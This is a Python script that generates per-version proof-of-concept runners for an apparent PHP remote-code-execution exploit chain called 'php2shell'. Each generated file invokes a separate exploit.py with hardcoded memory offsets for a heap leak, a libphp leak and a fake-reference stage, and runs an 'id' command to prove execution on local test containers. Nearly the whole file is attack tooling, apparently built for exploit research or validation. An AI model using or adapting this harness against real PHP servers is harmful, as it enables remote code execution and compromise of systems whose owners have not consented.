"""Generate 14 PoC files (one per PHP version) in poc/.

Each PoC is self-contained: it reads its version's parameters from versions.py,
runs exploit.py with the right offsets, and reports RCE proven / failed.
"""
import os

BASE = os.path.dirname(os.path.abspath(__file__))
POC_DIR = os.path.join(BASE, "poc")
os.makedirs(POC_DIR, exist_ok=True)

# Import versions
import sys
sys.path.insert(0, BASE)
from versions import VERSIONS, KNOWN_BLOCKED

TEMPLATE = '''#!/usr/bin/env python3
"""php2shell PoC — PHP {ver} ({container}, port {port}).

Chain: stage-1 heap leak -> stage-2 libphp leak -> stage-3 fake-ref RCE.
Offsets: zif=0x{zif:x} dtor=0x{dtor:x} htdata=0x{htdata:x}
Known status: {known}

Usage:
    python poc/poc_{tag}.py
"""
import subprocess, sys, os, time

BASE = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
EXPLOIT = os.path.join(BASE, "exploit.py")

VER = "{ver}"
PORT = {port}
CONTAINER = "{container}"
ZIF = 0x{zif:x}
DTOR = 0x{dtor:x}
HTDATA = 0x{htdata:x}
STAGE1_N = {stage1_n}
STAGE2_T = {stage2_t}
STAGE2_V = {stage2_v}
CARRIER = {carrier}
CMD = "id>/www/p1"
FETCH = "/p1"


def run(retries: int = 3, timeout: int = 600) -> tuple[bool, str]:
    url = f"http://127.0.0.1:{{PORT}}/"
    args = [
        sys.executable, EXPLOIT,
        "-u", url,
        "-c", CMD,
        "--zif-offset", hex(ZIF),
        "--dtor-offset", hex(DTOR),
        "--htdata-offset", hex(HTDATA),
        "--profile", "bookworm",
        "--huge-mb", "256",
        "--retries", str(retries),
        "--fetch", FETCH,
        "--no-auto-offsets",
        "-q",
    ]
    t0 = time.time()
    r = subprocess.run(args, capture_output=True, text=True, timeout=timeout)
    dt = time.time() - t0
    out = (r.stdout or "") + (r.stderr or "")
    ok = ("PROOF:" in out) and (r.returncode == 0)
    return ok, out, dt


def main() -> int:
    print(f"[*] php2shell PoC  VER={{VER}}  container={{CONTAINER}}  port={{PORT}}", flush=True)
    print(f"[*] offsets: zif=0x{{ZIF:x}} dtor=0x{{DTOR:x}} htdata=0x{{HTDATA:x}}", flush=True)
    ok, out, dt = run()
    # Print the last 20 lines of exploit output (skip noise)
    lines = out.strip().splitlines()
    for ln in lines[-20:]:
        print(f"    {{ln}}", flush=True)
    if ok:
        print(f"[+] RCE PROVEN  {{VER}}  ({{dt:.1f}}s)", flush=True)
        return 0
    else:
        # Determine which stage failed
        if "HEAP_LEAK_FAILED" in out:
            stage = "stage-1 (heap leak)"
        elif "LIBPHP_LEAK_FAILED" in out:
            stage = "stage-2 (libphp leak)"
        elif "EXPLOIT_FAILED" in out:
            stage = "stage-3 (RCE)"
        else:
            stage = "unknown"
        print(f"[-] FAILED  {{VER}}  ({{dt:.1f}}s)  blocker: {{stage}}", flush=True)
        return 1


if __name__ == "__main__":
    sys.exit(main())
'''

for ver, port, container, zif, dtor, htdata, s1n, s2t, s2v, carrier in VERSIONS:
    tag = ver.replace(".", "")
    known = KNOWN_BLOCKED.get(ver, "unknown")
    content = TEMPLATE.format(
        ver=ver, port=port, container=container,
        zif=zif, dtor=dtor, htdata=htdata,
        stage1_n=s1n, stage2_t=s2t, stage2_v=s2v, carrier=carrier,
        tag=tag, known=known,
    )
    path = os.path.join(POC_DIR, f"poc_{tag}.py")
    with open(path, "w", encoding="utf-8") as f:
        f.write(content)
    print(f"  wrote {path}", flush=True)

print(f"\n=== {len(VERSIONS)} PoC files generated in {POC_DIR} ===", flush=True)
